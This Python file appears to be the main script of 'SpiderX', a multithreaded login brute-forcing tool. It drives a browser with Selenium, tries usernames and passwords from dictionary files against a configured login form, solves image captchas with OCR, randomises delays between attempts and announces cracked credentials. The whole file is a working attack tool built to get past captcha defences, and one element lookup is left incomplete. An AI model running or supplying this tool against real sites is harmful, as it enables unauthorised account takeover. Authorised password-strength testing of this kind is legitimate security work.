# -*- coding: utf-8 -*-
"""
@Toolsname: SpiderX
@Author  : LiChaser
@Time    : 2025-01-25
@Version : 2.0
@Description:
    - 这是一个基于 Selenium 的自动化脚本。
    - 功能包括：登录、验证码识别、数据抓取等。
    - 使用了 ddddocr 进行验证码识别。
"""

import os
import concurrent.futures
import logging
import time
from selenium.common import NoSuchElementException
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import requests
import base64
import random

from config import DEFAULT_CONFIG
from core import browser
from core.captcha import CaptchaHandler
from core.utils import ThreadSafeCounter, chunk_list


# 修改全局变量声明
numbers = ThreadSafeCounter()
PWD = ""
USER = ""
usernames = []
passwords = []


def refresh_captcha(driver):
    """刷新验证码"""
    try:
        # 尝试点击刷新按钮
        if DEFAULT_CONFIG["captcha_refresh_xpath"]:
            refresh_btn = WebDriverWait(driver, 3).until(
                EC.element_to_be_clickable(
                    (By.XPATH, DEFAULT_CONFIG["captcha_refresh_xpath"])
                )
            )
            refresh_btn.click()
            return True
    except Exception as e:
        logging.error(f"验证码刷新失败: {str(e)}")

    # 备用方案：重新加载页面
    try:
        driver.refresh()
        WebDriverWait(driver, 5).until(
            EC.presence_of_element_located((By.XPATH, DEFAULT_CONFIG["name_xpath"]))
        )
        return True
    except Exception as e:
        logging.error(f"页面刷新失败: {str(e)}")
        return False


def handle_captcha(driver, captcha_handler):
    """处理验证码识别流程"""
    retry_count = 0
    while retry_count < DEFAULT_CONFIG["captcha_retry_limit"]:
        try:
            # 等待验证码图片加载
            captcha_img = WebDriverWait(
                driver, DEFAULT_CONFIG["captcha_timeout"]
            ).until(
                EC.presence_of_element_located(
                    (By.XPATH, DEFAULT_CONFIG["captcha_xpath"])
                )
            )

            # 等待图片完全加载
            # time.sleep(1)

            # 确保图片已完全加载
            try:
                is_loaded = driver.execute_script(
                    """
                    var img = arguments[0];
                    return img.complete && img.naturalWidth !== 0;
                """,
                    captcha_img,
                )

                if not is_loaded:
                    time.sleep(0.5)
            except Exception:
                pass

            # 获取验证码图片
            try:
                image_data = captcha_img.screenshot_as_png
            except Exception:
                img_src = captcha_img.get_attribute("src")
                if not img_src:
                    logging.error("验证码图片源为空")
                    retry_count += 1
                    refresh_captcha(driver)  # 只在获取失败时刷新
                    # time.sleep(1)
                    continue

                if img_src.startswith("data:image"):
                    try:
                        base64_data = img_src.split(",")[1]
                        image_data = base64.b64decode(base64_data)
                    except Exception as e:
                        logging.error(f"Base64解码失败: {str(e)}")
                        retry_count += 1
                        refresh_captcha(driver)  # 只在解码失败时刷新
                        # time.sleep(1)
                        continue
                else:
                    try:
                        response = requests.get(img_src, timeout=3)
                        image_data = response.content
                    except Exception:
                        logging.error("获取验证码图片失败")
                        retry_count += 1
                        refresh_captcha(driver)  # 只在获取失败时刷新
                        time.sleep(0.2)
                        continue

            # 识别验证码
            captcha_text = captcha_handler.recognize_captcha(image_data)
            if not captcha_text:
                logging.warning("验证码识别结果为空")
                retry_count += 1
                refresh_captcha(driver)  # 只在识别失败时刷新
                # time.sleep(1)
                continue

            # logging.info(f"识别到的验证码: {captcha_text}")

            # 填写验证码
            try:
                captcha_input = WebDriverWait(driver, 1).until(
                    EC.presence_of_element_located(
                        (By.XPATH, DEFAULT_CONFIG["captcha_input_xpath"])
                    )
                )

                captcha_input.clear()
                captcha_input.send_keys(captcha_text)
                time.sleep(2)
                return True  # 成功输入验证码后直接返回

            except Exception as e:
                logging.error(f"验证码输入失败: {str(e)}")
                retry_count += 1
                refresh_captcha(driver)  # 只在输入失败时刷新
                time.sleep(0.2)
                continue

        except Exception as e:
            logging.error(f"验证码处理失败: {str(e)}")
            retry_count += 1
            refresh_captcha(driver)  # 只在处理失败时刷新
            time.sleep(0.2)
            continue

    return False  # 达到最大重试次数后返回失败


def try_login(username, password_chunk):
    driver = None
    try:
        # 创建验证码处理器实例
        captcha_handler = CaptchaHandler()

        options = browser.setup_browser_options(DEFAULT_CONFIG["headless"])
        driver = browser.create_browser_driver(options)

        driver.set_page_load_timeout(DEFAULT_CONFIG["timeout"])
        driver.set_script_timeout(DEFAULT_CONFIG["timeout"])

        for password in password_chunk:
            retry_count = 0
            max_retries = DEFAULT_CONFIG["captcha_retry_limit"]

            while retry_count < max_retries:
                try:
                    # 访问目标URL
                    driver.get(DEFAULT_CONFIG["url"])

                    # 获取元素
                    username_field = WebDriverWait(driver, 5).until(
                        EC.presence_of_element_located(
                            (By.XPATH, DEFAULT_CONFIG["name_xpath"])
                        )
                    )
                    password_field = WebDriverWait(driver, 5).until(
                        EC.presence_of_element_located(
                            (By.XPATH, DEFAULT_CONFIG["pass_xpath"])
                        )
                    )
                    submit_btn = WebDriverWait(driver, 5).until(
                        EC.element_to_be_clickable(
                            (By.XPATH, DEFAULT_CONFIG["btn_xpath"])
                        )
                    )

                    # 填充表单
                    username_field.clear()
                    username_field.send_keys(username)
                    password_field.clear()
                    password_field.send_keys(password)

                    # 处理验证码
                    if DEFAULT_CONFIG["has_captcha"]:
                        captcha_success = handle_captcha(driver, captcha_handler)
                        if not captcha_success:
                            retry_count += 1
                            logging.info(f"验证码处理失败，重试第 {retry_count} 次")
                            continue

                    # 点击提交
                    submit_btn.click()
                    time.sleep(0.3)

                    # 检查登录结果
                    if check_login_success(driver):
                        # 使用更醒目的格式显示成功信息
                        print(
                            "\n"
                            + "\033[92m"
                            + "登陆成功: "
                            + username
                            + ":"
                            + password
                            + "\033[0m"
                        )  # 使用绿色显示成功信息
                        return (username, password)

                    # 检查验证码错误
                    if DEFAULT_CONFIG["has_captcha"] and check_captcha_error(driver):
                        retry_count += 1
                        logging.info(f"验证码错误，重试第 {retry_count} 次")
                        if retry_count < max_retries:
                            refresh_captcha(driver)
                            # time.sleep(0.5)
                            continue
                    else:
                        # 如果不是验证码错误，说明是密码错误
                        logging.info(f"密码错误: {username}:{password}")
                        break  # 尝试下一个密码

                except Exception as e:
                    logging.error(f"登录尝试异常: {str(e)}")
                    retry_count += 1
                    if retry_count < max_retries:
                        driver.refresh()
                        # time.sleep(0.5)
                        continue
                    else:
                        break

                finally:
                    time.sleep(
                        random.uniform(
                            DEFAULT_CONFIG["min_delay"], DEFAULT_CONFIG["max_delay"]
                        )
                    )

    except Exception as e:
        logging.error(f"浏览器操作失败: {str(e)}")
    finally:
        if driver:
            try:
                driver.quit()
            except Exception:
                pass
    return None


def check_captcha_error(driver):
    """检查是否为验证码错误"""
    try:
        error_texts = ["验证码错误", "验证码不正确", "验证码输入有误", "验证码失效"]
        page_source = driver.page_source.lower()
        return any(text.lower() in page_source for text in error_texts)
    except Exception as e:
        logging.warning(f"验证码错误检查出现异常: {str(e)}")
        return False


def check_login_success(driver):
    """检查是否登录成功"""
    try:
        if "错误" in driver.page_source:
            return False
        # 检查URL变化，假设登录成功后URL会包含某些关键字
        if "dashboard" in driver.current_url or "profile" in driver.current_url:
            print("登录成功，URL检测通过。")
            return True

        # 检查页面上的特定元素，例如欢迎消息
        success_message_elements = [
            "//div[contains(text(), '欢迎')]",
            "//div[contains(text(), '成功')]",
            "//div[contains(@class, 'logged-in')]",
        ]
        for xpath in success_message_elements:
            try:
                element = driver.find_element(By.XPATH, xpath)
                if element.is_displayed():
                    logging.warning(f"登录成功，页面元素检测通过：{xpath}")
                    return True
            except NoSuchElementException:
                continue

        # 检查是否还存在登录表单
        try:
            login_form = driver.find_element(
                By.XPATH,
            )
            if not login_form.is_displayed():
                print("登录表单不可见，可能登录成功。")
                return True
        except NoSuchElementException:
            print("登录表单不可见，可能登录成功。")
            return True
        return False
    except Exception as e:
        logging.error(f"检查登录成功时发生错误：{str(e)}")
        return False


def main():
    logging.basicConfig(
        level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
    )

    try:
        with open(DEFAULT_CONFIG["user_file"], "r", encoding="utf-8") as f:
            usernames = f.read().splitlines()
        with open(DEFAULT_CONFIG["pass_file"], "r", encoding="utf-8") as f:
            passwords = f.read().splitlines()
    except Exception as e:
        logging.error(f"加载字典文件失败: {str(e)}")
        return

    # 创建线程池
    stat_time = time.time()
    with concurrent.futures.ThreadPoolExecutor(
        max_workers=DEFAULT_CONFIG["threads"]
    ) as executor:
        futures = []
        for username in usernames:
            password_chunks = chunk_list(
                passwords, len(passwords) // DEFAULT_CONFIG["threads"]
            )
            futures.extend(
                [
                    executor.submit(try_login, username, chunk)
                    for chunk in password_chunks
                ]
            )

        try:
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    # 使用更醒目的格式显示成功信息
                    success_message = f"""
{"=" * 50}
    破解成功!!!
    用户名: {result[0]}
    密码: {result[1]}
    总用时: {time.time() - stat_time:.2f}秒
{"=" * 50}
"""
                    logging.info(success_message)
                    print(
                        "\n" + "\033[92m" + success_message + "\033[0m"
                    )  # 使用绿色显示成功信息

                    # 取消所有未完成的任务
                    for f in futures:
                        f.cancel()

                    # 关闭线程池
                    executor.shutdown(wait=False)

                    # 强制结束程序
                    os._exit(0)  # 使用 os._exit() 立即终止程序

        except KeyboardInterrupt:
            print("\n程序被用户中断")
            os._exit(1)
        except Exception as e:
            print(f"发生错误: {str(e)}")
            os._exit(1)
        finally:
            # 确保线程池被关闭
            executor.shutdown(wait=False)


if __name__ == "__main__":
    main()  # 调用主函数
